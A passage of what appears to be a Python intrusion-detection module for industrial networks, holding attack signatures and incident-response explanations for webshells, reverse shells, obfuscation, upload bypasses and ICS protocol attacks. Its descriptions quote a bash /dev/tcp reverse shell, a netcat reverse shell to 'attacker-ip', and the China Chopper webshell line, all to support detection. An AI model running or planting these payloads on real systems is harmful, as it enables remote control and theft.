        "description": "PsExec-style lateral movement",
        "severity": "CRITICAL",
        "mitre": ["T1021.002"],
    },
    "MAL_LATERAL_MOVEMENT_WMI": {
        "name": "Lateral Movement - WMI",
        "description": "WMI lateral movement",
        "severity": "CRITICAL",
        "mitre": ["T1047"],
    },
    "MAL_CREDENTIAL_DUMPING": {
        "name": "Credential Dumping",
        "description": "LSASS/SAM access - Mimikatz-like",
        "severity": "CRITICAL",
        "mitre": ["T1003"],
    },
    "MAL_PROCESS_INJECTION": {
        "name": "Process Injection",
        "description": "Code injection into a legitimate process",
        "severity": "CRITICAL",
        "mitre": ["T1055"],
    },
    "MAL_FILELESS_EXECUTION": {
        "name": "Fileless Malware Execution",
        "description": "Execution in memory only",
        "severity": "CRITICAL",
        "mitre": ["T1027", "T1059"],
    },
    "MAL_PERSISTENCE_REGISTRY": {
        "name": "Registry Persistence",
        "description": "Modify Run keys for persistence",
        "severity": "HIGH",
        "mitre": ["T1547.001"],
    },
    "MAL_PERSISTENCE_SERVICE": {
        "name": "Service Persistence",
        "description": "Create/modify Windows service",
        "severity": "HIGH",
        "mitre": ["T1543.003"],
    },
    "MAL_PERSISTENCE_SCHEDULED_TASK": {
        "name": "Scheduled Task Persistence",
        "description": "Create scheduled task",
        "severity": "HIGH",
        "mitre": ["T1053.005"],
    },
}

# Merge extended signatures into main dictionary
IT_ATTACK_SIGNATURES.update(IT_ATTACK_SIGNATURES_EXTENDED)


# =============================================================================
# ATTACK EXPLANATIONS - Detailed explanations for user understanding
# =============================================================================
# Each entry provides comprehensive context for incident response:
# - behavior: What was observed in the traffic
# - danger: Why this is dangerous
# - scenario: Possible attack scenario
# - risk_level: Overall risk assessment
# - ot_impact: Specific impact on OT/ICS systems
# - remediation: Suggested actions

ATTACK_EXPLANATIONS: Dict[str, Dict[str, str]] = {
    # =========================================================================
    # WEBSHELL ATTACKS
    # =========================================================================
    "WEBSHELL": {
        "behavior": "Detected malicious execution functions in an HTTP request: eval(), exec(), system(), shell_exec(), passthru(). These are PHP functions that allow execution of system commands.",
        "danger": "A webshell lets the attacker execute arbitrary commands on the server. The attacker can read/write files, download malware, create backdoors, and move laterally within the network.",
        "scenario": "1. Attacker uploads a malicious PHP file through an upload vulnerability\n2. Accesses the file via URL (e.g. /uploads/shell.php?cmd=whoami)\n3. Executes system commands and gathers information\n4. Installs a persistent backdoor\n5. Moves laterally to OT systems",
        "risk_level": "CRITICAL - Can take full control of the server",
        "ot_impact": "If the web server is connected to the OT network, the attacker can:\n- Access HMI/SCADA\n- Read data from PLC/RTU\n- Send spoofed control commands\n- Disrupt production",
        "remediation": "1. Isolate the affected server immediately\n2. Check access logs to identify the webshell file\n3. Delete the malicious file and check for other backdoors\n4. Patch the upload vulnerability\n5. Check for lateral movement to the OT network",
    },

    # Specific WebShell types
    "WEBSHELL_C99": {
        "behavior": "Detected c99 shell - one of the most common PHP webshells. Has a full web interface with file manager, command execution, and database access.",
        "danger": "c99 shell provides a full-featured backdoor with a GUI. The attacker can manage the entire server through the web interface.",
        "scenario": "1. Upload c99.php to the server\n2. Access it via browser\n3. Use the GUI to control the server\n4. Download/upload files\n5. Execute SQL queries and system commands",
        "risk_level": "CRITICAL - Full server control with GUI",
        "ot_impact": "c99 shell is often used to pivot into the OT network. It has port scanning and network mapping features.",
        "remediation": "1. Find and delete the c99.php file\n2. Check access logs\n3. Review uploaded files\n4. Change all passwords\n5. Scan for other backdoors",
    },

    "WEBSHELL_R57": {
        "behavior": "Detected r57 shell - a well-known Russian webshell with privilege escalation capabilities.",
        "danger": "r57 shell has built-in exploits to escalate privileges to root/SYSTEM.",
        "scenario": "1. Upload r57.php\n2. Run exploits to root the server\n3. Install kernel backdoor\n4. Create a new admin user\n5. Full compromise",
        "risk_level": "CRITICAL - Includes privilege escalation exploits",
        "ot_impact": "Root access lets the attacker modify kernel modules, bypass SELinux, and gain complete control.",
        "remediation": "1. IMMEDIATE isolation\n2. Check for privilege escalation\n3. Verify kernel integrity\n4. Full system reinstall recommended\n5. Forensic analysis",
    },

    "WEBSHELL_WSO": {
        "behavior": "Detected WSO (Web Shell by oRb) - a stealth webshell with password protection and encryption.",
        "danger": "WSO shell is very hard to detect because it has password protection, code obfuscation, and anti-forensics features.",
        "scenario": "1. Upload wso.php with a password\n2. Log in via the web interface\n3. Use advanced features\n4. Clear logs automatically\n5. Persistent access",
        "risk_level": "CRITICAL - Advanced stealth webshell",
        "ot_impact": "WSO has network tools to scan and pivot into the OT network. Hard to detect due to stealth features.",
        "remediation": "1. Search for WSO signatures\n2. Check for password-protected PHP files\n3. Review web server logs carefully\n4. Scan with updated antivirus\n5. Change all credentials",
    },

    "WEBSHELL_B374K": {
        "behavior": "Detected b374k shell - an Indonesian webshell with multi-user support and advanced features.",
        "danger": "b374k supports multiple concurrent users; this may indicate a group attack or APT.",
        "scenario": "1. Upload b374k shell\n2. Multiple attackers login\n3. Coordinated attack\n4. Data exfiltration parallel\n5. Large scale compromise",
        "risk_level": "CRITICAL - Multi-user APT-style attack",
        "ot_impact": "Multiple attackers can simultaneously attack different OT systems.",
        "remediation": "1. Immediate network isolation\n2. Block all attacker IPs\n3. Full incident response\n4. Coordinate with law enforcement\n5. Threat intel sharing",
    },

    "WEBSHELL_CHINA_CHOPPER": {
        "behavior": "Detected China Chopper - a very small webshell (70 bytes) used by APT groups. Signature: <?php @eval($_POST['']); ?>",
        "danger": "Extremely hard to detect because it is tiny and simple, and it is used by APT groups in targeted attacks.",
        "scenario": "1. APT group uploads chopper via exploit\n2. Uses a custom client to connect\n3. Stealthy operations\n4. Long-term persistence\n5. Targeted data theft",
        "risk_level": "CRITICAL - APT weapon, targeted attack",
        "ot_impact": "China Chopper has been used in well-known OT/ICS attacks. Indicates APT activity.",
        "remediation": "1. URGENT: Engage CERT/incident response\n2. Full threat hunting\n3. Check for APT IOCs\n4. Network-wide forensics\n5. Coordinate with national CERT",
    },

    "WEBSHELL_WEEVELY": {
        "behavior": "Detected Weevely - a stealth PHP webshell with encrypted communication and polymorphic code.",
        "danger": "Weevely uses encryption for C2 communication, making traffic hard to intercept and analyze.",
        "scenario": "1. Generate polymorphic weevely backdoor\n2. Upload via exploit\n3. Connect over an encrypted channel\n4. Stealth operations\n5. Avoid detection",
        "risk_level": "CRITICAL - Military-grade stealth webshell",
        "ot_impact": "Weevely's encryption makes OT traffic monitoring ineffective. Can detect by behavior only.",
        "remediation": "1. Network behavior analysis\n2. Memory forensics\n3. Traffic pattern analysis\n4. Full system reimaging\n5. Enhanced monitoring",
    },

    "WEBSHELL_PYTHON": {
        "behavior": "Detected Python webshell using os.system(), subprocess, eval(). Commonly found in Flask/Django apps.",
        "danger": "Python webshells can access system libraries and network APIs, and Python is an interpreted language.",
        "scenario": "1. Exploit Python web framework\n2. Upload .py backdoor\n3. Execute system commands\n4. Access Python libraries\n5. Network manipulation",
        "risk_level": "CRITICAL - Full Python environment access",
        "ot_impact": "Python webshells can import scapy and socket to attack OT protocols directly.",
        "remediation": "1. Check Python application directories\n2. Review wsgi/app files\n3. Verify Python packages\n4. Check pip installed packages\n5. Sandbox analysis",
    },

    # =========================================================================
    # REVERSE SHELL ATTACKS
    # =========================================================================
    "REVERSE_SHELL_BASH": {
        "behavior": "Detected bash reverse shell pattern: bash -i >& /dev/tcp/IP/PORT 0>&1. This is a common technique for connecting back to the attacker.",
        "danger": "A reverse shell provides interactive shell access; the attacker has full terminal control.",
        "scenario": "1. Attacker exploits a web app\n2. Injects a bash reverse shell command\n3. Server connects back to the attacker\n4. Attacker gets an interactive shell\n5. Full system control",
        "risk_level": "CRITICAL - Interactive shell access",
        "ot_impact": "A bash shell can access OT tools such as modpoll, s7-client, dnp3-client to attack protocols.",
        "remediation": "1. Kill reverse shell process\n2. Block outbound connection\n3. Check /proc for suspicious processes\n4. Review bash history\n5. Patch exploit",
    },

    "REVERSE_SHELL_NETCAT": {
        "behavior": "Detected netcat reverse shell: nc -e /bin/bash IP PORT. Netcat is the Swiss Army knife of network tools.",
        "danger": "Netcat can forward any port, transfer files, and provide remote shell execution.",
        "scenario": "1. Upload netcat binary\n2. Execute: nc -e /bin/sh attacker-ip 4444\n3. Attacker's listener receives the connection\n4. Interactive shell established\n5. Pivoting platform",
        "risk_level": "CRITICAL - Versatile attack tool",
        "ot_impact": "Netcat can forward OT ports (502, 102) to the outside, bypassing firewall restrictions.",
        "remediation": "1. Find and kill nc processes\n2. Remove netcat binaries\n3. Block outbound on non-standard ports\n4. Monitor for nc in processes\n5. Implement egress filtering",
    },

    "REVERSE_SHELL_POWERSHELL": {
        "behavior": "Detected PowerShell reverse shell with encoded commands or System.Net.Sockets.",
        "danger": "PowerShell reverse shells can bypass AppLocker, AMSI, and execution policies.",
        "scenario": "1. Exploit Windows service/IIS\n2. Execute encoded PowerShell command\n3. Download stage2 payload\n4. Establish encrypted C2\n5. Fileless attack - no disk artifacts",
        "risk_level": "CRITICAL - Fileless, stealthy",
        "ot_impact": "PowerShell can access WMI, .NET, and COM to interact with OT software (Wonderware, Ignition).",
        "remediation": "1. Check PowerShell event logs (4104)\n2. Review ScriptBlock logging\n3. Kill suspicious pwsh processes\n4. Enable Constrained Language Mode\n5. AMSI integration",
    },

    "REVERSE_SHELL_PYTHON": {
        "behavior": "Detected Python reverse shell using socket.connect(). Python is usually available on Linux servers.",
        "danger": "A Python shell can import powerful libraries: paramiko, requests, scapy.",
        "scenario": "1. Exploit web framework\n2. Execute Python one-liner\n3. Import socket library\n4. Connect back to attacker\n5. Interactive Python REPL",
        "risk_level": "CRITICAL - Scripting language access",
        "ot_impact": "Python has scapy to craft custom OT packets and bypass protocol restrictions.",
        "remediation": "1. Kill python processes\n2. Check running scripts\n3. Review Python history\n4. Restrict Python execution\n5. Monitor imports",
    },

    "REVERSE_SHELL_SOCAT": {
        "behavior": "Detected socat reverse shell - an advanced relay tool with encryption support.",
        "danger": "Socat supports SSL/TLS encryption, making C2 traffic invisible to IDS.",
        "scenario": "1. Upload socat binary\n2. Create encrypted tunnel\n3. TLS/SSL wrapped connection\n4. Bypass IDS inspection\n5. Persistent backdoor",
        "risk_level": "CRITICAL - Encrypted C2",
        "ot_impact": "Encrypted socat tunnels can relay OT protocols without detection.",
        "remediation": "1. Find socat processes\n2. Certificate-based detection\n3. Kill encrypted tunnels\n4. TLS inspection if possible\n5. Binary whitelisting",
    },

    # =========================================================================
    # OBFUSCATION DETECTION
    # =========================================================================
    "OBFUSCATION_GZIP": {
        "behavior": "Detected gzip-compressed payload in HTTP. Code pattern: gzinflate(), gzuncompress(), gzdecode().",
        "danger": "Gzip compression hides malicious code and bypasses signature-based detection.",
        "scenario": "1. Compress webshell with gzip\n2. Upload compressed payload\n3. Server decompresses and executes it\n4. Avoids antivirus detection\n5. Stealth backdoor",
        "risk_level": "HIGH - Evasion technique",
        "ot_impact": "Compressed payloads can contain OT malware components.",
        "remediation": "1. Decompress and analyze\n2. Scan decompressed content\n3. Block if malicious\n4. Update signatures\n5. Content inspection",
    },

    "OBFUSCATION_HEX": {
        "behavior": "Detected hex-encoded strings: \\x41\\x42\\x43 or hex2bin(). Commonly used to encode strings.",
        "danger": "Hex encoding hides keywords such as 'eval', 'system' from IDS detection.",
        "scenario": "1. Encode malicious strings\n2. Execute hex2bin at runtime\n3. Bypass keyword filters\n4. String concatenation obfuscation\n5. Dynamic code execution",
        "risk_level": "MEDIUM - Simple obfuscation",
        "ot_impact": "OT malware commands can be hex-encoded to avoid protocol filters.",
        "remediation": "1. Decode hex strings\n2. Analyze decoded content\n3. Update detection rules\n4. Pattern matching\n5. Behavioral detection",
    },

    "OBFUSCATION_ROT13": {
        "behavior": "Detected str_rot13() - a simple substitution cipher. Often combined with base64.",
        "danger": "Multi-layer encoding (rot13 + base64 + gzip) makes analysis harder.",
        "scenario": "1. Apply multiple encoding layers\n2. Each layer decodes previous\n3. Final payload malicious\n4. Slow down analysis\n5. Buy time for attack",
        "risk_level": "MEDIUM - Delay tactic",
        "ot_impact": "Multiple layers delay incident response, give attacker more time.",
        "remediation": "1. Automated decoding tools\n2. Layer-by-layer analysis\n3. Sandbox execution\n4. Time-based detection\n5. Behavior analysis",
    },

    "OBFUSCATION_VARIABLE_VARIABLE": {
        "behavior": "Detected PHP variable variables: $$var, ${$var}. Allows dynamic function calls.",
        "danger": "Variable variables bypass static analysis and make code unpredictable.",
        "scenario": "1. Store function name in variable\n2. Call via $$var syntax\n3. Bypass keyword detection\n4. Dynamic malicious calls\n5. Hard to trace",
        "risk_level": "HIGH - Advanced evasion",
        "ot_impact": "Can hide OT protocol function calls from static analysis.",
        "remediation": "1. Dynamic analysis required\n2. Runtime monitoring\n3. Sandbox execution\n4. Behavior-based detection\n5. Code review",
    },

    "OBFUSCATION_CHR_CONCAT": {
        "behavior": "Detected chained chr() concatenation: chr(101).chr(118).chr(97).chr(108) = 'eval'.",
        "danger": "Character concatenation completely hides keywords from string matching.",
        "scenario": "1. Break keyword into ASCII codes\n2. Concatenate at runtime\n3. Execute dynamically\n4. Zero string signatures\n5. Pure evasion",
        "risk_level": "HIGH - Sophisticated evasion",
        "ot_impact": "OT commands can be chr-encoded to bypass IDS.",
        "remediation": "1. Runtime string assembly detection\n2. chr() function monitoring\n3. Dynamic analysis\n4. Entropy analysis\n5. Behavioral rules",
    },

    # =========================================================================
    # FILE UPLOAD ATTACKS
    # =========================================================================
    "FILE_UPLOAD_DOUBLE_EXTENSION": {
        "behavior": "Detected double-extension bypass: shell.php.jpg, backdoor.asp.png. Exploits weak validation.",
        "danger": "Server parses the file as executable despite the image extension.",
        "scenario": "1. Upload filter checks .jpg\n2. File passes validation\n3. Server executes it as .php\n4. Webshell installed\n5. Bypass successful",
        "risk_level": "CRITICAL - Common bypass technique",
        "ot_impact": "Double extension files often used in ICS/SCADA web interfaces.",
        "remediation": "1. Check REAL file type (magic bytes)\n2. Whitelist extensions properly\n3. Rename uploaded files\n4. Store outside webroot\n5. Disable script execution",
    },

    "FILE_UPLOAD_NULL_BYTE": {
        "behavior": "Detected null byte injection: shell.php%00.jpg. Exploits C-style string termination.",
        "danger": "Null byte truncates filename, file saved as .php instead of .jpg.",
        "scenario": "1. Inject %00 in filename\n2. Validation sees .jpg\n3. Filesystem saves .php\n4. Webshell uploaded\n5. Classic attack",
        "risk_level": "CRITICAL - Classic vulnerability",
        "ot_impact": "Null byte attacks common in legacy OT web interfaces (old Apache/PHP).",
        "remediation": "1. Input sanitization\n2. Remove null bytes\n3. Update web server\n4. Modern PHP versions immune\n5. Defense in depth",
    },

    "FILE_UPLOAD_MIME_MISMATCH": {
        "behavior": "Detected file with mismatched MIME type: Content-Type: image/jpeg but the content is PHP code.",
        "danger": "MIME type spoofing bypasses content-type validation.",
        "scenario": "1. Set a fake Content-Type header\n2. Upload PHP as 'image/jpeg'\n3. Validation checks MIME only\n4. File executed as script\n5. Bypass achieved",
        "risk_level": "HIGH - Validation bypass",
        "ot_impact": "MIME spoofing can upload malware to OT historians, HMI servers.",
        "remediation": "1. Check file magic bytes\n2. Don't trust MIME headers\n3. Server-side validation\n4. File content scanning\n5. Proper storage",
    },

    # =========================================================================
    # PROTOCOL-SPECIFIC ATTACKS
    # =========================================================================
    "MODBUS_UNAUTHORIZED_WRITE": {
        "behavior": "Detected Modbus function 05 (Write Single Coil) or 06 (Write Single Register) from an unauthorized IP.",
        "danger": "Unauthorized Modbus writes can change process values and cause physical damage.",
        "scenario": "1. Attacker access to Modbus network\n2. Scan for PLCs (port 502)\n3. Write malicious values\n4. Alter process parameters\n5. Physical consequences",
        "risk_level": "CRITICAL - Direct OT impact",
        "ot_impact": "Modbus writes can:\n- Start/stop motors\n- Change setpoints\n- Disable alarms\n- Cause equipment damage",
        "remediation": "1. Block unauthorized IP immediately\n2. Verify PLC state\n3. Check process safety\n4. Implement Modbus firewall rules\n5. Use Modbus authentication if available",
    },

    "S7COMM_UNAUTHORIZED_ACCESS": {
        "behavior": "Detected S7Comm commands (Start/Stop PLC, Upload/Download) from an unauthorized IP.",
        "danger": "S7Comm allows full PLC control: start, stop, upload, and download programs.",
        "scenario": "1. Connect to S7 PLC (port 102)\n2. Issue STOP command\n3. Download modified logic\n4. Restart with backdoor\n5. Persistent control",
        "risk_level": "CRITICAL - PLC compromise",
        "ot_impact": "S7Comm attacks can:\n- Stop production\n- Modify control logic\n- Install PLC rootkit\n- Disable safety functions",
        "remediation": "1. Immediately disconnect attacker\n2. Verify PLC program integrity\n3. Check for logic changes\n4. Restore from backup if needed\n5. Implement S7 password protection",
    },

    "DNP3_UNAUTHORIZED_CONTROL": {
        "behavior": "Detected DNP3 control commands (CROB - Control Relay Output Block) from an unauthorized source.",
        "danger": "DNP3 controls critical infrastructure: power grid, water systems.",
        "scenario": "1. Access to DNP3 network\n2. Send CROB commands\n3. Open/close breakers\n4. Grid manipulation\n5. Blackout potential",
        "risk_level": "CRITICAL - National infrastructure",
        "ot_impact": "DNP3 manipulation can cause:\n- Power outages\n- Grid instability\n- Cascading failures\n- National emergency",
        "remediation": "1. IMMEDIATE isolation\n2. Notify grid operators\n3. Manual verification of all states\n4. Incident response team\n5. Coordinate with authorities",
    },

    "ENIP_UNAUTHORIZED_CIP": {
        "behavior": "Detected EtherNet/IP CIP commands (Set Attribute, Forward Open) from an unknown IP.",
        "danger": "CIP over EtherNet/IP controls Rockwell PLCs, drives, safety systems.",
        "scenario": "1. Connect to CIP devices (port 44818)\n2. Send Set Attribute commands\n3. Modify device parameters\n4. Establish connections\n5. Control industrial devices",
        "risk_level": "CRITICAL - Rockwell ecosystem attack",
        "ot_impact": "EtherNet/IP attacks affect:\n- ControlLogix PLCs\n- Safety controllers\n- Variable frequency drives\n- Complete production lines",
        "remediation": "1. Block attacker IP\n2. Verify all CIP devices\n3. Check safety systems\n4. Review connections\n5. Implement CIP security features",
    },

    "IEC104_SPONTANEOUS_COMMANDS": {
        "behavior": "Detected IEC 60870-5-104 commands from an IP that is not the master station.",
        "danger": "IEC-104 controls power systems and usually has no authentication.",
        "scenario": "1. Spoof master station\n2. Send control commands\n3. Manipulate substations\n4. Cause protection trips\n5. Grid instability",
        "risk_level": "CRITICAL - Power system",
        "ot_impact": "IEC-104 attacks on power grids:\n- Substation manipulation\n- Breaker control\n- False data injection\n- Protection relay manipulation",
        "remediation": "1. Emergency isolation\n2. Manual verification\n3. Notify SCADA operators\n4. Incident investigation\n5. Implement IEC-104 security extensions",
    },

    "PROFINET_DCP_SPOOFING": {
        "behavior": "Detected Profinet DCP packets modifying device names/IP addresses.",
        "danger": "DCP spoofing can cause network chaos, device misconfiguration.",
        "scenario": "1. Send malicious DCP packets\n2. Change device IP/name\n3. Disrupt communication\n4. Network reconfiguration\n5. Production stop",
        "risk_level": "HIGH - Network disruption",
        "ot_impact": "Profinet attacks affect:\n- Siemens PLC networks\n- Device addressing\n- Network topology\n- Production continuity",
        "remediation": "1. Identify rogue DCP source\n2. Reconfigure affected devices\n3. Use static IP configurations\n4. Implement Profinet security\n5. Network segmentation",
    },

    # =========================================================================
    # NETWORK ATTACKS (ADDED)
    # =========================================================================
    "ARP_CACHE_POISONING": {
        "behavior": "Detected gratuitous ARP replies or ARP responses without requests.",
        "danger": "ARP poisoning redirects traffic and enables MITM attacks.",
        "scenario": "1. Send fake ARP replies\n2. Poison ARP caches\n3. Intercept traffic\n4. Modify OT commands\n5. Physical damage possible",
        "risk_level": "CRITICAL - MITM in OT",
        "ot_impact": "ARP poisoning in OT:\n- Intercept Modbus/S7 traffic\n- Modify control commands\n- Inject false sensor data\n- Safety system bypass",
        "remediation": "1. Enable Dynamic ARP Inspection\n2. Use static ARP entries for critical devices\n3. Implement 802.1X\n4. Network segmentation\n5. IDS monitoring",
    },

    "DHCP_STARVATION": {
        "behavior": "Detected rapid DHCP requests from multiple MAC addresses - DHCP starvation attack.",
        "danger": "Exhausts the DHCP pool, installs a rogue DHCP server, and controls network addressing.",
        "scenario": "1. Flood DHCP requests\n2. Deplete IP pool\n3. Install rogue DHCP\n4. Control client IPs/gateways\n5. MITM attack",
        "risk_level": "HIGH - Network control",
        "ot_impact": "Rogue DHCP in OT can:\n- Redirect traffic through attacker\n- Deny service to OT devices\n- Manipulate network topology",
        "remediation": "1. Enable DHCP snooping\n2. Trusted DHCP ports only\n3. Static IPs for critical OT devices\n4. Port security\n5. Rogue DHCP detection",
    },

    "VLAN_HOPPING": {
        "behavior": "Detected double-tagging or switch spoofing attempts - VLAN hopping attack.",
        "danger": "VLAN hopping bypasses network segmentation to access isolated networks.",
        "scenario": "1. Send double-tagged frames\n2. Bypass VLAN isolation\n3. Access restricted VLANs\n4. Reach OT network from IT\n5. Segmentation bypass",
        "risk_level": "CRITICAL - Segmentation breach",
        "ot_impact": "VLAN hopping to OT network:\n- Bypass IT/OT separation\n- Access critical controls\n- Avoid monitoring\n- Stealth access",
        "remediation": "1. Disable DTP (Dynamic Trunking Protocol)\n2. Configure native VLAN properly\n3. Use dedicated VLAN for trunks\n4. Private VLANs for OT\n5. 802.1Q security",
    },

    "STP_MANIPULATION": {
        "behavior": "Detected BPDU (Bridge Protocol Data Unit) spoofing - STP manipulation attack.",
        "danger": "STP attacks can become root bridge, redirect traffic, cause loops.",
        "scenario": "1. Send superior BPDUs\n2. Become root bridge\n3. Control spanning tree\n4. Redirect all traffic\n5. Network-wide MITM",
        "risk_level": "CRITICAL - Network topology control",
        "ot_impact": "STP manipulation in OT:\n- Redirect all traffic through attacker\n- Cause network loops (DoS)\n- Intercept critical traffic",
        "remediation": "1. Enable BPDU Guard\n2. Root Guard on uplinks\n3. PortFast on access ports\n4. STP security features\n5. Network monitoring",
    },

    # =========================================================================
    # RECONNAISSANCE (ADDED)
    # =========================================================================
    "NETWORK_MAPPING": {
        "behavior": "Detected a systematic ping sweep or ARP scan of the subnet.",
        "danger": "Network mapping is the first step in identifying the attack surface.",
        "scenario": "1. Scan entire subnet\n2. Identify live hosts\n3. Map network topology\n4. Find OT devices\n5. Plan attack",
        "risk_level": "MEDIUM - Reconnaissance phase",
        "ot_impact": "Network mapping finds:\n- PLC IP addresses\n- HMI locations\n- Engineering stations\n- Network architecture",
        "remediation": "1. Monitor for scan patterns\n2. Block scanning IPs\n3. Implement IDS rules\n4. Network segmentation\n5. Honeypots",
    },

    "SERVICE_FINGERPRINTING": {
        "behavior": "Detected banner grabbing and version detection attempts.",
        "danger": "Service fingerprinting identifies vulnerable versions.",
        "scenario": "1. Connect to services\n2. Grab banners\n3. Identify software versions\n4. Match to vulnerabilities\n5. Prepare exploits",
        "risk_level": "MEDIUM - Pre-attack recon",
        "ot_impact": "Fingerprinting finds:\n- PLC firmware versions\n- SCADA software versions\n- Vulnerable services\n- Exploit opportunities",
        "remediation": "1. Disable unnecessary banners\n2. Version obfuscation\n3. Monitor connection attempts\n4. Patch management\n5. Network segmentation",
    },

    # =========================================================================
    # MALWARE BEHAVIORS (ADDED)
    # =========================================================================
    "LATERAL_MOVEMENT_PSEXEC": {
        "behavior": "Detected PsExec-style lateral movement: SMB + service creation patterns.",
        "danger": "Lateral movement spreads malware across the network.",
        "scenario": "1. Compromise one system\n2. Use PsExec to spread\n3. Create remote services\n4. Execute malware remotely\n5. Network-wide infection",
        "risk_level": "CRITICAL - Malware spreading",
        "ot_impact": "Lateral movement to:\n- Engineering workstations\n- HMI systems\n- Historians\n- OT networks",
        "remediation": "1. Block SMB lateral movement\n2. Disable PSExec if not needed\n3. Monitor service creation\n4. Network segmentation\n5. Application whitelisting",
    },

    "CREDENTIAL_DUMPING": {
        "behavior": "Detected LSASS memory access or SAM database access - credential theft.",
        "danger": "Credential dumping steals passwords for privilege escalation.",
        "scenario": "1. Run Mimikatz/similar tool\n2. Dump LSASS memory\n3. Extract credentials\n4. Use for lateral movement\n5. Domain compromise",
        "risk_level": "CRITICAL - Credential theft",
        "ot_impact": "Stolen OT credentials enable:\n- PLC programming access\n- SCADA admin access\n- Safety system control\n- Complete compromise",
        "remediation": "1. Enable Credential Guard\n2. Protected Process Light for LSASS\n3. Disable WDigest\n4. Monitor LSASS access\n5. Privileged access management",
    },

    # =========================================================================
    # DATA EXFILTRATION
    # =========================================================================
    "DATA_EXFIL_ENCRYPTED": {
        "behavior": "Detected large encrypted outbound data transfers (HTTPS, SSH, custom protocol).",
        "danger": "Encrypted exfiltration hides stolen data from inspection.",
        "scenario": "1. Collect sensitive data\n2. Encrypt before transfer\n3. Exfiltrate via HTTPS\n4. Bypass DLP\n5. Data stolen",
        "risk_level": "CRITICAL - Data theft",
        "ot_impact": "Encrypted exfil can steal:\n- PLC programs\n- Process designs\n- Network diagrams\n- Credentials\n- Trade secrets",
        "remediation": "1. SSL/TLS inspection\n2. Monitor data volumes\n3. Endpoint DLP\n4. Behavior analytics\n5. Incident response",
    },

    "DATA_EXFIL_ICMP": {
        "behavior": "Detected ICMP tunneling - data hidden in ping packets.",
        "danger": "ICMP is often allowed through firewalls, making it a good exfiltration channel.",
        "scenario": "1. Encode data in ICMP payload\n2. Send ping packets\n3. C2 server receives data\n4. Bypass firewall\n5. Stealth exfiltration",
        "risk_level": "HIGH - Stealth exfiltration",
        "ot_impact": "ICMP exfiltration is hard to detect in OT networks, where ICMP is commonly used for diagnostics.",
        "remediation": "1. Monitor ICMP packet sizes\n2. Block ICMP to external IPs\n3. Inspect ICMP payloads\n4. Rate limiting\n5. IDS signatures",
    },

    # =========================================================================
    # DENIAL OF SERVICE
    # =========================================================================
    "TCP_SYN_FLOOD": {
        "behavior": "Detected a high volume of SYN packets without completed handshakes.",
        "danger": "A SYN flood exhausts the connection table and denies service.",
        "scenario": "1. Send massive SYN packets\n2. Don't complete handshake\n3. Fill connection table\n4. Legitimate connections denied\n5. Service unavailable",
        "risk_level": "HIGH - Availability impact",
        "ot_impact": "SYN flood on OT devices:\n- PLC communication failure\n- HMI freeze\n- SCADA disconnection\n- Process interruption",
        "remediation": "1. Enable SYN cookies\n2. Rate limiting\n3. Firewall SYN flood protection\n4. Increase connection table\n5. DDoS mitigation",
    },

    "UDP_FLOOD": {
        "behavior": "Detected a high volume of UDP packets targeting a specific service.",
        "danger": "A UDP flood overwhelms network bandwidth or the application.",
        "scenario": "1. Send high-volume UDP\n2. Consume bandwidth\n3. Overwhelm target\n4. Network congestion\n5. Service degradation",
        "risk_level": "HIGH - Network DoS",
        "ot_impact": "UDP floods affect:\n- DNP3 communication\n- IEC-104 traffic\n- Network performance\n- Time-sensitive OT protocols",
        "remediation": "1. Rate limiting\n2. Traffic filtering\n3. QoS for OT traffic\n4. DDoS protection\n5. Network monitoring",
    },

    "MODBUS_FLOOD": {
        "behavior": "Detected excessive Modbus requests targeting a PLC.",
        "danger": "Modbus flood can overwhelm PLC CPU, cause control failure.",
        "scenario": "1. Send rapid Modbus requests\n2. PLC CPU overloaded\n3. Control loop delays\n4. Process instability\n5. Safety shutdown",
        "risk_level": "CRITICAL - Process safety",
        "ot_impact": "Modbus floods cause:\n- Control system failure\n- Production stoppage\n- Safety system delays\n- Equipment damage potential",
        "remediation": "1. Rate limit Modbus requests\n2. Firewall rules\n3. PLC access control\n4. Network segmentation\n5. Backup control systems",
    },
    "S7COMM_FLOOD": {
        "behavior": "Detected excessive S7Comm requests targeting a Siemens PLC.",
        "danger": "S7Comm flood can crash PLC, disrupt control operations.",
        "scenario": "1. Send rapid S7Comm requests\n2. PLC overwhelmed\n3. Control logic delays\n4. Process instability\n5. Safety shutdown",
        "risk_level": "CRITICAL - Siemens PLC safety",
        "ot_impact": "S7Comm floods cause:\n- PLC crashes\n- Production halts\n- Safety system failures\n- Equipment damage risk",
        "remediation": "1. Rate limit S7Comm requests\n2. Firewall rules\n3. PLC access control\n4. Network segmentation\n5. Backup control systems",
    },

    # =========================================================================
    # XXE INJECTION
    # =========================================================================
    "XXE_INJECTION": {
        "behavior": "Detected XXE (XML External Entity) injection: <!ENTITY, SYSTEM file://, php://filter.",
        "danger": "XXE allows reading local files, SSRF, and in some cases RCE.",
        "scenario": "1. Upload/submit XML document\n2. Include malicious ENTITY\n3. Server parse XML\n4. Read sensitive files (/etc/passwd, web.config)\n5. Data exfiltration",
        "risk_level": "CRITICAL - File disclosure, RCE possible",
        "ot_impact": "XXE can read:\n- PLC configuration files\n- SCADA credentials\n- Network diagrams\n- Process documentation",
        "remediation": "1. Disable external entity processing\n2. Use safe XML parsers\n3. Input validation\n4. WAF rules\n5. Update XML libraries",
    },

    "SSRF_ATTACK": {
        "behavior": "Detected SSRF (Server-Side Request Forgery): access to localhost, 169.254.169.254, internal IPs.",
        "danger": "SSRF forces the server to request internal resources, bypassing the firewall and accessing cloud metadata.",
        "scenario": "1. Find a parameter that accepts URLs\n2. Inject an internal URL\n3. Server makes the request\n4. Access internal services\n5. Cloud metadata theft (AWS keys)",
        "risk_level": "CRITICAL - Internal network access",
        "ot_impact": "SSRF in the OT network:\n- Access internal PLCs\n- Query SCADA databases\n- Reach isolated systems\n- Bypass segmentation",
        "remediation": "1. URL whitelist only\n2. Block private IP ranges\n3. Network segmentation\n4. Metadata service protection\n5. Input validation",
    },

    "TEMPLATE_INJECTION": {
        "behavior": "Detected SSTI (Server-Side Template Injection): {{...}}, {%...%}, ${...} in input.",
        "danger": "Template injection leads to RCE, sandbox bypass, and full server compromise.",
        "scenario": "1. Find template engine (Jinja2, Twig, etc.)\n2. Inject template syntax\n3. Access internal objects\n4. Execute arbitrary code\n5. System compromise",
        "risk_level": "CRITICAL - Remote code execution",
        "ot_impact": "Template engines in OT dashboards/HMIs can be exploited for full access.",
        "remediation": "1. Never put user input in templates\n2. Use sandboxed templates\n3. Input sanitization\n4. Update template engines\n5. Disable dangerous functions",
    },

    "DESERIALIZATION": {
